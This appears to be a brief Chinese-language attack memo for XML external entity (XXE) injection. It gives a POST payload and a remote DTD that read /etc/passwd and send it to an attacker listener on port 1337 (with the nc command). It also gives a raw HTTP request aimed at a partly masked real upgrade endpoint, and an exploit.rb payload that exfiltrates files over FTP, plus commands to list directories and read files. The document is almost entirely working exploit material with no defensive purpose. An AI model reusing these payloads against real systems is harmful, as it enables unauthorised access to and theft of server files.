# POST的payload

```
<?xml version='1.0' encoding='UTF-8' ?>
<!DOCTYPE foo [
<!ENTITY % b SYSTEM "file:///etc/passwd">
<!ENTITY % asd SYSTEM "http://example.com/lol.xml"> %asd; %rrr;]>
<vxml version="2.1">
<form>
<block>
<prompt>payload executed</prompt>
</block>
</form>
</vxml>
```

# lol.xml文件内容
`<!ENTITY % c "<!ENTITY &#37; rrr SYSTEM 'http://example.com:1337/%b;'>">%c;`

# 攻击者 NC监听

nc -lvvp 1337


## exploit.rb

POST
```
POST /xxxx/CheckInnerUpgrade.ashx HTTP/1.1
Host: i2.xxxx.cn
Accept: */*
Ext-System: MUMU/4.4.4/0/2/3012/3.3.0/1
Ext-User: -1/008796748083554/0
User-Agent: MuMu
Content-Type: text/xml
Content-Length: 653
Connection: close

<?xml                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               version="1.0" encoding="UTF-8"?>
<!DOCTYPE hack [
<!ENTITY % xxe SYSTEM 'http://xx.108.xx.227:81/

'>
%xxe;
%param1;
]>
<hack>&exfil;</hack>
```

修改exploit.rb 的#{ARGV[0]，为想要读取的目录

`payload = "<!ENTITY % file SYSTEM \'file:///'><!ENTITY % param1 \"<!ENTITY exfil SYSTEM \'ftp://34.141.59:25/%file;\'>\">"`

命令1： 列目录
ruby exploit.rb  /

命令2：读文件
ruby exploit.rb  /etc/passwd
